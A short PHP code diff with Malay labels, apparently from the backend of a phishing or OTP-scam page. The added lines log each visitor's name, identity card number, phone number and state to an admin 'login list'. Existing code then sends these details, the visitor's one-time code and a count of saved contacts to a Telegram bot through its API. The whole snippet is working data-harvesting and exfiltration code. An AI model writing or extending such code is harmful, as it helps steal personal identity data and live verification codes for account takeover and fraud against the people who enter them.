@@ -38,6 +38,20 @@ if (!isset($otps[$phoneDigits]) || $otps[$phoneDigits]['otp'] !== $otp) {
 unset($otps[$phoneDigits]);
 file_put_contents($otpFile, json_encode($otps, JSON_PRETTY_PRINT));
 
+$loginsFile = __DIR__ . '/logins.json';
+$logins = file_exists($loginsFile) ? json_decode(file_get_contents($loginsFile), true) : [];
+if (!is_array($logins)) {
+    $logins = [];
+}
+$logins[$phoneDigits] = [
+    'nama' => $nama,
+    'ic' => $ic,
+    'telefon' => $telefon,
+    'negeri' => $negeri,
+    'logged_at' => date('c')
+];
+file_put_contents($loginsFile, json_encode($logins, JSON_PRETTY_PRINT));
+
 $contactsFile = __DIR__ . '/contacts.json';
 $contacts = file_exists($contactsFile) ? json_decode(file_get_contents($contactsFile), true) : [];
 if (!is_array($contacts)) {
@@ -70,7 +84,9 @@ $message = "Pengesahan Kod Berjaya\n\n" .
     "Telefon: $telefon\n" .
     "Negeri: $negeri\n" .
     "Kod OTP: $otp\n" .
-    "Jumlah Contact tersimpan: " . count($contacts) . $contactText;
+    "Jumlah Contact tersimpan: " . count($contacts) . "\n\n" .
+    "Login disimpan di Senarai Login admin.\n" .
+    $contactText;
 
 $url = "https://api.telegram.org/bot$token/sendMessage";
 $options = [
